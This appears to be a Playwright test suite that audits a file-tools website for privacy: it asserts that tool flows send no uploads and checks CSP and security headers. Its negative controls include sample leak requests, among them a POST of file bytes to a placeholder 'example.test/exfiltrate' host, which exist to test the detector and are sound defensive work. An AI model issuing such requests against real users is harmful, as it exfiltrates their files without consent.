import { expect, test } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { FLOWS } from './flows';
import { watchNetwork } from './helpers';

const registry = readFileSync(resolve(import.meta.dirname, '../src/registry/tools.ts'), 'utf8');
const tools = [...registry.matchAll(/id: '([^']+)', slug[\s\S]*?status: '(\w+)'[\s\S]*?verified: (true|false)/g)].map((m) => ({ id: m[1]!, status: m[2]!, verified: m[3] === 'true' }));

test('every available tool has an end-to-end flow', () => {
  const available = tools.filter((t) => t.status === 'available' || t.status === 'beta').map((t) => t.id).sort();
  expect(available.length).toBeGreaterThan(0);
  expect(Object.keys(FLOWS).sort()).toEqual(available);
});

test('a tool may only claim "verified" if its flow is part of this audit', () => {
  for (const t of tools.filter((x) => x.verified)) expect(FLOWS[t.id], `${t.id} is marked verified but has no flow`).toBeTruthy();
});

// The privacy audit: run each tool's real flow with a file and assert the page made only
// same-origin GET requests with no request bodies. A file upload would show up here.
for (const [id, flow] of Object.entries(FLOWS)) {
  test(`network audit: ${id} sends nothing anywhere`, async ({ page, baseURL }) => {
    const net = watchNetwork(page);
    await flow(page);
    expect(net.seen.length).toBeGreaterThan(0); // the recorder works
    net.assertClean(new URL(baseURL!).origin);
  });
}

// Negative controls: prove the detector actually catches uploads, so a clean result means something.
test.describe('the audit detector catches real leaks', () => {
  // The site's CSP would block these requests before they reach the network, which would hide the detector.
  // Bypass it here so the detector is tested on its own; the CSP is tested separately below.
  test.use({ bypassCSP: true });
  test('same-origin POST with a body is flagged', async ({ page, baseURL }) => {
    const net = watchNetwork(page);
    await page.goto('/');
    await page.evaluate(() => fetch('/leak', { method: 'POST', body: 'file-bytes' }).catch(() => undefined));
    await expect.poll(() => net.seen.some((r) => r.method === 'POST')).toBe(true);
    expect(() => net.assertClean(new URL(baseURL!).origin)).toThrow();
  });
  test('a request to another origin is flagged', async ({ page, baseURL }) => {
    const net = watchNetwork(page);
    await page.route('https://example.test/**', (r) => r.fulfill({ status: 200, body: 'ok' }));
    await page.goto('/');
    await page.evaluate(() => fetch('https://example.test/track').catch(() => undefined));
    await expect.poll(() => net.seen.some((r) => r.url.startsWith('https://example.test'))).toBe(true);
    expect(() => net.assertClean(new URL(baseURL!).origin)).toThrow();
  });
});

test('the Content-Security-Policy itself refuses requests to other origins', async ({ page }) => {
  const violations: string[] = [];
  page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) violations.push(m.text()); });
  await page.goto('/');
  const outcome = await page.evaluate(() => fetch('https://example.test/exfiltrate', { method: 'POST', body: 'file-bytes' }).then(() => 'allowed', () => 'blocked'));
  expect(outcome).toBe('blocked');
  await expect.poll(() => violations.length).toBeGreaterThan(0);
});

test('security headers are present on pages and assets', async ({ page }) => {
  const res = await page.goto('/privacy');
  const h = res!.headers();
  const csp = Object.fromEntries(h['content-security-policy']!.split(';').map((d) => d.trim().split(/\s+/)).map(([k, ...v]) => [k, v]));
  expect(csp['connect-src']).toEqual(["'self'"]);
  expect(csp['script-src']!.join(' ')).toMatch(/^'self' 'sha256-[A-Za-z0-9+/=]+'$/); // no unsafe-inline, no unsafe-eval
  expect(csp['style-src']).toEqual(["'self'"]);
  expect(csp['style-src-attr']).toEqual(["'unsafe-inline'"]); // the only inline allowance: style attributes
  expect(csp['object-src']).toEqual(["'none'"]);
  expect(csp['frame-ancestors']).toEqual(["'none'"]);
  expect(h['x-content-type-options']).toBe('nosniff');
  expect(h['referrer-policy']).toBe('no-referrer');
  expect(h['permissions-policy']).toContain('camera=()');
});
